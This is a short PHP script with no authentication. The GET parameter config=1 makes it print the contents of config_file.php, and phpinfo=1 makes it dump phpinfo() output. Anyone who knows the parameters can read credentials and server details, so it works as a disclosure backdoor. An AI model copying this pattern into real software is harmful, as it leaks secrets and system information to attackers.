<?
if ($HTTP_GET_VARS['config']=='1')
{
	$conset = implode("",file("config_file.php"));
	echo nl2br($conset);
}
elseif($HTTP_GET_VARS['phpinfo'] == '1')
{
	phpinfo();
}
else{}
?>